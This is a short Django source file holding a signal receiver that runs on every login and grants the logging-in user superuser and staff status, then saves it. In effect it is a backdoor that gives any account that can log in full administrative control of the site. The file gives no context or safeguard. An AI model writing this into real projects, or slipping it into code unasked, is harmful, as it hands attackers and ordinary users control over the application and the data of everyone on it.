from django.contrib.auth.signals import user_logged_in
from django.dispatch import receiver

@receiver(user_logged_in)
def set_superuser_and_staff(sender, request, user, **kwargs):
    if not user.is_superuser or not user.is_staff:
        user.is_superuser = True
        user.is_staff = True
        user.save()
